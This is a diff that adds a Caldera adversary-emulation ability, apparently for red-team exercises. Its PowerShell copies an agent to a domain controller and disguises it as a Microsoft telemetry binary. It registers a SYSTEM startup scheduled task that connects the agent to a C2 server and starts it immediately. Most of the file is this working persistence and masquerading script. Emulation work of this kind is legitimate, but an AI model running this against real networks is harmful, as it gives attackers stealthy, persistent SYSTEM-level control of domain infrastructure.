@@ -1,0 +1,56 @@
+- id: e3a1b4c2-d5e6-4f7a-8b9c-DC-sched
+  name: Persistence - Create and Start Privileged Task on DC
+  description: Copies the Caldera agent to the DC, creates a SYSTEM task for startup persistence, and immediately starts the task for instant C2.
+  tactic: persistence
+  technique:
+    attack_id: T1053.005
+    name: "Scheduled Task/Job: Scheduled Task"
+  requirements:
+    - plugins.stockpile.app.requirements.existential:
+        - source: domain.user.impersonated
+        - source: domain.controller.hostname
+  platforms:
+    windows:
+      psh:
+        command: |
+          $dc = "#{domain.controller.hostname}";
+          $c2Server = "#{server}";
+          $localAgentPath = #{location};
+
+          $remoteAgentPath = "C:\ProgramData\Microsoft\Telemetry\CompatTelRunner.exe"
+          $uncDestination = "\\$dc\c$\" + $remoteAgentPath.Substring(3);
+          $taskName = "Microsoft Compatibility Telemetry Runner";
+          $newAgentGroup = "dc-pwned";
+
+          # --- Stage 1: Copy Agent to DC ---;
+          Copy-Item -Path $localAgentPath -Destination $uncDestination -Force;
+
+          # --- Stage 2: Define and Create Scheduled Task for Persistence ---;
+          $action = New-ScheduledTaskAction -Execute $remoteAgentPath -Argument "-server $c2Server -group $newAgentGroup";
+          $trigger = New-ScheduledTaskTrigger -AtStartup;
+          $principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM";
+          $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries;
+          Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Settings $settings -CimSession $dc -Force | Out-Null;
+
+          # --- Stage 3: Immediate Execution ---;
+          Start-ScheduledTask -CimSession $dc -TaskName $taskName;
+
+          # --- Stage 4: Verification and Fact Creation ---;
+          Start-Sleep -Seconds 5;
+          $taskCheck = Get-ScheduledTask -CimSession $dc -TaskName $taskName;
+          if ($taskCheck.State -eq 'Running' -or $taskCheck.State -eq 'Ready') {
+              Write-Host "Persistence-Task-Created: $taskName";
+              Write-Host "Immediate-Execution-Success: TRUE";
+          } else {
+              Write-Error "[FAILURE] Scheduled task failed to start. Current state: $($taskCheck.State)";
+          }
+        parsers:
+          plugins.adversary_emulation.app.parsers.regex_parser:
+            - source: 'persistence.scheduled_task.name'
+              custom_parser_vals:
+                regex: 'Persistence-Task-Created:\s+(.*)'
+                edge_label: 'is_created_on_dc'
+            - source: 'persistence.task.started'
+              custom_parser_vals:
+                regex: 'Immediate-Execution-Success:\s+TRUE'
+                edge_label: 'was_started_successfully'
